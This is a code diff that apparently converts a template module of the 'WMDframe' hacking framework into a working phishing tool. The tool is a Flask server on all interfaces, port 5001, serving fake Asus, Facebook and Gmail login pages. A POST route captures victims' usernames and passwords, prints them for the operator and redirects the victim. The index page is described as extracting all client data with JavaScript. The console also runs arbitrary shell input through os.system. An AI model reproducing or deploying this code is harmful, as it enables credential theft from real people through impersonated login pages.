@@ -3,19 +3,19 @@
 # MIT - (c) 2016 ThomasTJ (TTJ)
 #
 # Module for WMDframe
-# This modules is used for XXX
+# This modules is used for creating a local server with phishing pages
 #
 
 
 import argparse
 import os
+from flask import Flask, render_template, request, redirect
 try:
     import core.core as core
     import core.commands as comm
     import core.modules as cmodules
     from core.colors import bc as bc
 except:
-    # Running module outside the WMDframe might require path changing to import core modules
     import sys
     sys.path.append('././')
     import core.core as core
@@ -63,50 +63,45 @@ class Options():
     """Main class for module."""
 
     Author = 'Thomas TJ (TTJ)'
-    Name = 'Template module'
-    Call = 'tempmod'
-    Modulename = 'templatemodule'  # Filename
-    Category = 'cracktheWWW'
-    Type = 'sha512'
+    Name = 'Webpage phishing'
+    Call = 'webphis'
+    Modulename = 'webpage_phishing'  # Filename
+    Category = 'phishing'
+    Type = 'webpage'  # sin = single action/program, aut = multiple programs combined for attack
     Version = '0.1'
     License = 'MIT'
-    Description = 'Showing structure of modules'
+    Description = 'Run a local flask server with phishing pages.'
     Datecreation = '2017/02/01'
     Lastmodified = '2017/02/01'
 
-    def __init__(self, req_var1, req_var2):
+    def __init__(self):
         """Define variables and show options on run."""
-        self.req_var1 = req_var1
-        self.req_var2 = req_var2
         self.show_all()
 
     def poss_opt(self):
         """Possible options. These variables are checked when the user tries to 'set' an option."""
-        return ('req_var1', 'req_var2')
+        return ('NA')
 
     def show_opt(self):
         """Show the possible options."""
         print(
-            ''
-            '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 8, 'RQ', 18, 'VALUE', 'DESCRIPTION')) + bc.ENDC +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 8, '--', 18, '-----', '-----------')) +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'req_var1:', 8, 'y', 18, self.req_var1, 'Setting1')) +
-            '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'req_var2:', 8, 'n', 18, self.req_var2, 'Setting2')) +
+            '' +
+            '\n\t' + bc.OKBLUE + 'AVAILABLE PHISING SITES:' + bc.ENDC +
+            '\n\t' + '/asus' +
+            '\n\t' + '/facebook' +
+            '\n\t' + '/gmail' +
+            '\n\t' + '/index' + '  <--  Extract all client data with JS' +
             '\n'
         )
 
     def show_commands(self):
         """Show the possible commands."""
         print(
-            ''
+            '' +
             '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
             '\n\t' + '---------' +
             '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script')) +
-            # '\n\t' + ('%-*s ->\t%s' % (9, 'custom', 'Custom extra function')) +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'runcom', 'Run program with specific arguments <runcom [args]>')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information')) +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help')) +
-            '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for "runcom"')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info')) +
             '\n\t' + ('%-*s ->\t%s' % (9, 'set', 'Set options, set [PARAMETER] [VALUE]')) +
@@ -137,46 +132,71 @@ class Options():
 # END OPTIONS
 
 
+app = Flask(__name__)
+
+
+# ==================== #
+# FLASK ROUTES - START
+# ==================== #
+@app.route('/')
+def index():
+    """Main index"""
+    return render_template('index.html')
+
+
+@app.route('/asus')
+def asus():
+    """Phishing page"""
+    return render_template('asus.html')
+
+
+@app.route('/gmail')
+def gmail():
+    """Phishing page"""
+    return render_template('gmail.html')
+
+
+@app.route('/facebook')
+def facebook():
+    """Phishing page"""
+    return render_template('facebook.html')
+
+
+@app.route('/redirect', methods=['POST'])
+def redirectUser():
+    """Redirecting user after phishing"""
+    Username = request.form['Username']
+    Passwd = request.form['Passwd']
+    redirectUser = request.form['redirect']
+    print(
+        '\n\t' + '[+]  Found something for you!' +
+        '\n\t' + bc.OKGREEN + '[+]  Username: ' + Username +
+        '\n\t' + bc.OKGREEN + '[+]  Password: ' + Passwd +
+        '\n\t' + bc.WARN + '[+]  Redirect: ' + redirectUser +
+        '\n' + bc.ENDC
+    )
+    return redirect(redirectUser)
+# ==================== #
+# FLASK ROUTES - END
+# ==================== #
+
+
 def run():
     """The main run function."""
-    print('\tRunning running')
+    print('\t[*]  Starting webserver on 0.0.0.0 and port 5001.')
+    print('\t[*]  0.0.0.0 = Your LAN IP')
+    print('\t[*]  Visit 0.0.0.0:5001/[FAKE_SITE]')
+    # Production:
+    app.run(host='0.0.0.0', port=5001)
+    # Debug:
+    # app.run(debug=True, host='0.0.0.0', port=5001)
 
 
-# OPTIONAL
-def runcom(arguments):
-    """The run function with special arguments - optional."""
-    print('\tRunning special with arguments')
-    print(arguments)
-
-
-# OPTIONAL
-def predefinedCommands():
-    """Show predifined commands - optional."""
-    print(
-        '' +
-        '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC +
-        '\n\t' + '---------'
-    )
-
-    print("""
-         -> Super args            = -T4 -A -v
-         -> Super duber           = -sS -sU -T4 -A -v
-         -> Better args           = -p 1-65535 -T4 -A -v
-    """)
-
-    print(
-        '\t' + bc.ITALIC + 'Use \'runcom\' followed by arguments' + bc.ENDC +
-        '\n'
-    )
-
-
-# OPTIONAL
 def info():
     """Show the modules info - optional."""
     print("""
-        Module for use in WMDframe.
-        """)
-    # Delete the parser info, if args.parse is not used.
+        Module for use in WMDframe.""")
+
     if parser.format_help():
         print('\n\t' + bc.OKBLUE + 'COMMANDLINE ARGUMENTS:' + bc.ENDC)
         for line in parser.format_help().strip().splitlines():
@@ -184,60 +204,36 @@ def info():
     print('')
 
 
-# OPTIONAL
-def helpMe():
-    """Show a help menu - optional."""
-    pass
-
-
 # CONSOLE
 def console():
     """The main console for the module."""
     value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'tmpmod:' + bc.ENDC + ' ')
     userinput = value.split()
-    # Show options
     if 'so' in userinput[:1]:
         sop.show_opt()
-    # Show all info
     elif 'sa' in userinput[:1]:
         sop.show_all()
-    # Run module
+    elif 'info' in userinput[:1]:
+        info()
     elif 'run' in userinput[:1]:
         run()
-    # Set options
     elif 'set' in userinput[:1]:
-        useroption = str(userinput[1:2]).strip('[]\'')  # The parameter to set
-        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter" to set parameter
-        # uservalue = value.split(' ', 2)[2]  # Use all text after "set parameter"
+        useroption = str(userinput[1:2]).strip('[]\'')
+        uservalue = str(userinput[2:3]).strip('[]\'')  # Use single word after "set parameter"
         if useroption not in sop.poss_opt():
             print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
         elif useroption in sop.poss_opt():
             setattr(sop, useroption, uservalue)
             print('\n      ' + useroption + '\t> ' + uservalue + '\n')
-    # Open module in new window
     elif 'invoke' in userinput[:1]:
         comm.invokeModule(Options.Call)
         return None
-    # Go back to WMDframe console
     elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
         return None
-    # Run command
     elif ':' in userinput[:1]:
         print('')
         os.system(str(value[1:]))
         print('')
-    # Show info
-    elif 'info' in userinput[:1]:
-        info()
-    # Show help
-    elif 'help' in userinput[:1]:
-        helpMe()
-    # Show predefined commands
-    elif 'pd' in userinput[:1]:
-        predefinedCommands()
-    # Run special command from userinput
-    elif 'runcom' in userinput[:1]:
-        runcom(str(userinput[1:]).strip('[]\''))
     else:
         command = str(userinput[:1]).strip('[]\'')
         print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
@@ -248,24 +244,16 @@ def console():
 def main():
     """The first function to run."""
     print('\n')
-    print('\t  ______                   __  ___          __      __     ')
-    print('\t /_  __/___ ___  ____     /  |/  /___  ____/ /_  __/ /__   ')
-    print('\t  / / / __ `__ \/ __ \   / /|_/ / __ \/ __  / / / / / _ \  ')
-    print('\t / / / / / / / / /_/ /  / /  / / /_/ / /_/ / /_/ / /  __/  ')
-    print('\t/_/ /_/ /_/ /_/ .___/  /_/  /_/\____/\__,_/\__,_/_/\___/   ')
-    print('\t             /_/                                           ')
+    print('\t _       __     __                              ____  __    _      __    _              ')
+    print('\t| |     / /__  / /_  ____  ____ _____ ____     / __ \/ /_  (_)____/ /_  (_)___  ____ _  ')
+    print('\t| | /| / / _ \/ __ \/ __ \/ __ `/ __ `/ _ \   / /_/ / __ \/ / ___/ __ \/ / __ \/ __ `/  ')
+    print('\t| |/ |/ /  __/ /_/ / /_/ / /_/ / /_/ /  __/  / ____/ / / / (__  ) / / / / / / / /_/ /   ')
+    print('\t|__/|__/\___/_.___/ .___/\__,_/\__, /\___/  /_/   /_/ /_/_/____/_/ /_/_/_/ /_/\__, /    ')
+    print('\t                 /_/          /____/                                         /____/     ')
     print('\n')
-    # If module require root:
-    # if os.getuid() != 0:
-    #    print('r00tness is needed due to XXX!')
-    #    print('Run the script again as root/sudo')
-    #    return None
-    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
-    # comm.checkNetConnectionV()
-    # print('')
     global sop
-    # The parameters to be passed to the module on run
-    sop = Options('FIRST', 'SECOND')
+    # The parameters to be passed to the module on init
+    sop = Options()
     if args.run:
         run()
     else:
@@ -276,5 +264,5 @@ if args.run:
     main()
 
 
-# For testing uncomment "main()", place module in root directory and run module with "python3 modulename.py"
-# main()
+# For testing uncomment "main()" and run module with "python3 modulename.py"
+main()
